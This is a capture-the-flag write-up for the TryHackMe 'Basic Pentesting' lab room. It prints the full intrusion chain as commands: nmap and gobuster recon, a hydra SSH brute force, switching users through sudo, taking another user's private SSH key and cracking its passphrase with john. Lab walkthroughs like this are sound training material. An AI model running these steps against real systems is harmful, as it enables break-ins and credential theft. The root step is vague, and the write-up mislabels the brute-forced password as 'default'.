TryHackMe: Basic Pentesting Writeup
Room Link: https://tryhackme.com/room/basicpentestingjt
Difficulty: Easy
Tags: #WebAppSecurity #PrivilegeEscalation #CTF

1. Reconnaissance
Nmap Scan
First, I ran an nmap scan to discover open ports and services:

bash
nmap -sV -A -T4 <TARGET_IP>
Findings:

Port 22 (SSH) - OpenSSH 7.2p2 Ubuntu 4ubuntu2.4

Port 80 (HTTP) - Apache httpd 2.4.18 (Ubuntu)

Port 445 (SMB) - Samba smbd 4.3.11-Ubuntu

Web Enumeration
I used gobuster to find hidden directories:

bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
Discovered:

/development – Contains two files: dev.txt and notes.txt

dev.txt hinted at weak credentials for user J and K.

2. Exploitation
SMB Enumeration
I checked SMB shares using smbclient:

bash
smbclient -L //<TARGET_IP> -N
Found an anonymous share, but no useful data.

Brute-Forcing SSH
Using hydra with the rockyou.txt wordlist:

bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>
Found Credentials:

Username: jan

Password: armando

Logged in via SSH:

bash
ssh jan@<TARGET_IP>
3. Privilege Escalation
Checking Sudo Permissions
Ran sudo -l and found that jan could run /bin/bash as user kay:

bash
sudo -u kay /bin/bash
Accessing Kay’s SSH Key
Found a private SSH key in /home/kay/.ssh/id_rsa. Copied it locally and used ssh2john to crack it:

bash
python /usr/share/john/ssh2john.py id_rsa > kay_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt kay_hash.txt
Cracked Passphrase: beeswax

Logged in as kay using the key:

bash
ssh -i id_rsa kay@<TARGET_IP>
Root Flag
Found the final flag in /root/root.txt after checking sudo -l again.

4. Lessons Learned
Weak Passwords: Default credentials (jan:armando) allowed initial access.

Misconfigured Sudo: Improper sudo permissions led to privilege escalation.

Exposed SSH Keys: Storing private keys without strong passphrases is risky.

🔗 More Writeups: My GitHub Security Writeups
